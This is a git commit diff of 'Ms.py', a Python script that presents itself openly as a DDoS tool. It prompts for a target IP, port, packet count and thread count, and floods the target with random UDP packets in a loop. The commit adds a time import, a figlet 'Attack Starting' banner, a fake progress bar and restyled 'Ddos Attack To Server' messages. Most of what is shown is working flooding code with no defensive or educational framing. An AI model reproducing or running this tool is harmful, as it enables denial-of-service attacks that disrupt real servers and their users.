b386b4075aef2fc1df6f1e46725dd30af7a33e15
MsSquadxxx <91820365+MsSquadxxx@users.noreply.github.com>
2021-10-13 23:57:58 +0700

    Update Ms.py

--- Ms.py
+++ Ms.py
@@ -1,5 +1,6 @@
 #by Mamank Sa-mp
 import random
+import time
 import socket
 import threading
 import os
@@ -11,11 +12,25 @@ print("| |\/| / __\___ \ / _` | | | |/ _` |/ _` |")
 print("| |  | \__ \___) | (_| | |_| | (_| | (_| |")
 print("|_|  |_|___/____/ \__, |\__,_|\__,_|\__,_|")
 print("                     |_|                  ")
+print("==========================================")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
 choice = str(input(" Lanjut gak ?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print ("[                    ] 0% ")
+time.sleep(5)
+print ("[=====               ] 25%")
+time.sleep(5)
+print ("[==========          ] 50%")
+time.sleep(5)
+print ("[===============     ] 75%")
+time.sleep(5)
+print ("[====================] 100%")
+time.sleep(3)
 def run():
   data = random._urandom(1024)
   i = random.choice(("[*]","[!]","[#]"))
@@ -25,9 +40,9 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" |Ddos Attack To Server|")
+      print(i +" |##### /Ddos Attack To Server\ #####|")
     except:
-      print("[!] |Ddos Attack To Server|")
+      print("[!] |##### /Ddos Attack To Server\ #####|")
 
 def run2():
   data = random._urandom(16)
